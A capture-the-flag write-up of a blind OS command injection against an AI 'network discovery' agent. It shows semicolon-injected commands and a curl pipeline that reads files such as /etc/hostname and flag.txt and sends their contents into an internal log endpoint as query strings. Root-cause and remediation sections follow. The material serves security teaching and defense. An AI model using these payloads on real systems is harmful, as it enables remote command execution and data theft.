# Blind Network Ninja — ARKX Advanced L9

**Blind Network Ninja** is a "network discovery" agent: give it a host, it replies only `Online` or `Offline`. No output, no errors. Behind that single bit of feedback is a shell that runs your input, and an internal logging endpoint that becomes an unintended out-of-band channel for reading command output the UI hides.

> **Flag:** `flag-ac8de4` · **Category:** AI Agent / OS Command Injection · **Impact:** Critical (blind RCE)

## A one-bit oracle

```text
localhost    -> Online
127.0.0.1    -> Online
8.8.8.8      -> Offline
google.com   -> Offline
```

Two possible responses, nothing else. Whatever we do, the only feedback is `Online` / `Offline`.

## Finding the injection

```text
example.com | ls                    -> Offline   (pipe is not treated as a separator)
google.com; curl localhost/level/   -> Online     (semicolon runs a second command)
```

The `;` separator executes an injected command in the backend shell. When the injected `curl` to `localhost` succeeds, the service flips to `Online` — that becomes the blind signal that the command actually ran.

## An exfiltration sink

Browsing `/level/9/logs` reveals it records every HTTP request as JSON, but keeps only the **method, path, and query string** — bodies and headers are dropped. So stolen data has to ride in the query string of a request the injected command makes to that endpoint.

`curl -G --data-urlencode x@-` reads stdin and URL-encodes it into a query parameter. Piping a command's output into it lands that output in the logs:

```bash
google.com; cat /etc/hostname | curl -G --data-urlencode x@- http://localhost/level/9/logs
# -> Online
# log: {"path":"/level/9/logs","query":"x=ctf-session-REDACTED%0a"}
```

The container hostname arrived in the logs — the channel works, even though the UI only ever said `Online`.

## Recovering the flag

`/flag.txt` at the filesystem root logged an empty query (absent/empty). The flag sits in the working directory:

```bash
google.com; cat flag.txt | curl -G --data-urlencode x@- http://localhost/level/9/logs
# -> Online
# log: {"path":"/level/9/logs","query":"x=flag-ac8de4"}
```

> **flag-ac8de4**

## Root cause

- **Unsanitized input into a shell.** The "check host" tool concatenates user input into a shell command, so metacharacters like `;` inject arbitrary commands — classic OS command injection.
- **Suppressing output is not a control.** A blind injection with no visible output is still full RCE; one bit of feedback is enough.
- **An internal logging endpoint became an OOB channel.** `/level/9/logs` records request query strings, handing the attacker a covert path to read output the UI hides.
- **Excessive agent authority.** The agent proxies a shell command built from raw user input, with no host allow-listing or argument validation.

## Impact

Arbitrary command execution on the backend as the service account — read files, environment variables, and secrets, and pivot to internal services. Because output suppression is defeated by out-of-band exfiltration, any data is recoverable. A real attacker gets a quiet, self-logged shell behind what looks like a harmless uptime checker.

## Remediation

- Don't build shell commands from user input. Resolve/ping hosts with a library call, not a shell; if a binary is unavoidable, pass arguments as a list with no shell interpolation and strictly validate the host.
- Apply egress filtering so the backend can't reach arbitrary internal endpoints; the logging sink should not be reachable as an exfiltration target.
- Monitor for injection patterns and anomalous outbound requests.

## Mapping

| Framework | Classification |
|---|---|
| OWASP LLM (2025) | LLM06 Excessive Agency + insecure output / tool handling |
| MITRE ATLAS | AML.T0050 LLM-enabled execution · AML.T0053 LLM Plugin Compromise · OOB exfiltration |
| CWE | CWE-78 OS Command Injection · CWE-77 Command Injection |
